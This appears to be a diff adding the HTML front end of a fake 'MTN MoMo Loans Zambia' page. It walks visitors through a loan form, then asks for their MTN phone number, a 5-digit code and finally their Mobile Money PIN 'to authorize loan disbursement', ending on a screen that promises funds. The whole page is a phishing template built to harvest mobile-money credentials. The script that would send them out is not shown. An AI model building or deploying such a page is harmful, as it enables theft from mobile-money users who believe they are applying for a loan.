@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTN MoMo Loans Zambia</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">MTN <span>MoMo Loans</span></div>
+            <p>Instant Financial Assistance in Zambia</p>
+        </header>
+
+        <main>
+            <!-- Step 1: Loan Application Questions -->
+            <form id="loanForm" class="form-step active">
+                <h2>Apply for an Instant Loan</h2>
+                <div class="form-group">
+                    <label for="fullName">Full Name (as on NRC)</label>
+                    <input type="text" id="fullName" required placeholder="Enter your full name">
+                </div>
+                <div class="form-group">
+                    <label for="loanAmount">Select Loan Amount</label>
+                    <select id="loanAmount" required>
+                        <option value="">-- Choose Amount --</option>
+                        <option value="500 ZMW">K500</option>
+                        <option value="1000 ZMW">K1,000</option>
+                        <option value="2500 ZMW">K2,500</option>
+                        <option value="5000 ZMW">K5,000</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="loanPurpose">Purpose of Loan</label>
+                    <select id="loanPurpose" required>
+                        <option value="">-- Select Purpose --</option>
+                        <option value="Business Capital">Business Capital</option>
+                        <option value="Medical Emergency">Medical Emergency</option>
+                        <option value="School Fees">School Fees</option>
+                        <option value="Personal Upkeep">Personal Upkeep</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="repaymentPeriod">Repayment Duration</label>
+                    <select id="repaymentPeriod" required>
+                        <option value="">-- Select Duration --</option>
+                        <option value="1 Month">1 Month</option>
+                        <option value="3 Months">3 Months</option>
+                        <option value="6 Months">6 Months</option>
+                    </select>
+                </div>
+                <button type="button" id="nextToVerification" class="btn">Proceed to Verification</button>
+            </form>
+
+            <!-- Step 2: Phone Number & Company Code -->
+            <div id="verificationStep" class="form-step">
+                <h2>Account Verification</h2>
+                <p class="subtitle">Enter your MTN mobile number and company code to verify loan eligibility.</p>
+                <div class="form-group">
+                    <label for="phone">MTN Phone Number</label>
+                    <input type="tel" id="phone" placeholder="096xxxxxxx / 097xxxxxxx" required>
+                </div>
+                <div class="form-group">
+                    <label for="companyCode">5-Digit Company Code</label>
+                    <input type="text" id="companyCode" maxlength="5" placeholder="Enter 5-digit code" required>
+                </div>
+                <button type="button" id="nextToPin" class="btn">Verify Code</button>
+            </div>
+
+            <!-- Step 3: MTN Pin Page -->
+            <div id="pinStep" class="form-step">
+                <div class="mtn-badge">MTN Mobile Money</div>
+                <h2>Enter MoMo PIN</h2>
+                <p class="subtitle">Enter your 4-digit MTN Mobile Money PIN to authorize loan disbursement.</p>
+                <div class="form-group">
+                    <label for="mtnPin">Mobile Money PIN</label>
+                    <input type="password" id="mtnPin" maxlength="4" placeholder="****" required>
+                </div>
+                <button type="button" id="submitAll" class="btn mtn-yellow">Authorize & Disburse</button>
+            </div>
+
+            <!-- Step 4: Success Screen -->
+            <div id="successStep" class="form-step">
+                <div class="success-icon">✓</div>
+                <h2>Application Processing</h2>
+                <p>Your loan application is under review. Funds will be deposited into your MTN MoMo account shortly.</p>
+            </div>
+        </main>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
